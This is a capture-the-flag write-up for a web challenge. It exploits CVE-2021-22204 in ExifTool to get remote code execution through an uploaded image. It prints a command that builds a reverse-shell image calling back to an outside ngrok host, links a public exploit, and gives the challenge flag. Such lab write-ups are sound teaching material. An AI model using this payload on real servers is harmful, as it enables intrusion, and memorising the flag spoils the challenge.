# Shell

## 1. Summary

- **Category**: Web / Forensic
- **Points**: 50
- **Solves**: 465

### Description

> `This simple web app lets you upload images to inspect their EXIF metadata. But something feels off… maybe your uploads are being examined more closely than you realize. Can you get the server to execute a command of your choosing and expose the hidden flag.txt file?`
>
> `Note: Only image uploads are allowed. No brute force needed — just the right approach and format.`

## 2. Analysis

### Vulnerability

- **CVE-2021-22204 (ExifTool Arbitrary Code Execution)**: When accessing the "Exif Metadata Viewer" site, there is a form to upload files. Upon uploading a standard image, the server displays the file's metadata, including the ExifTool version.
- **Version Detection**: The server reports `ExifTool Version Number : 12.16`.
- **Root Cause**: Versions of ExifTool prior to 12.24 do not properly neutralize data before passing it to the `eval()` function when parsing DjVu files embedded within images. This allows an attacker to execute arbitrary shell commands by crafting a malicious image file.

## 3. Exploit Flow

1. **Identifying the Exploit**
   Based on the version information (`12.16`), it was confirmed that the server is vulnerable to **CVE-2021-22204**. A publicly available exploit script was used to generate a malicious image.

2. **Crafting the Malicious Image**
   The exploit script embeds a Perl-based payload into the metadata of an image file. In this case, a reverse shell payload was configured to connect back to a local listener via `ngrok`.

   ```sh
   python3 exploit-CVE-2021-22204.py -s 0.tcp.ap.ngrok.io 14052
   ```

3. **Gaining Access**
   After running the command, a crafted image file is generated. Uploading this file to the web application triggers the vulnerability as ExifTool attempts to parse the metadata.

4. **Command Execution**
   Once the upload is processed, the server executes the embedded command, granting a reverse shell. From there, the `flag.txt` file can be read directly from the server's file system.

## 4. Final Solution

- **Exploit Script**: [Public Exploit Repository](https://github.com/UNICORDev/exploit-CVE-2021-22204.git)

## 5. Flag

`0xfun{h1dd3n_p4yl04d_1n_pl41n_51gh7}`
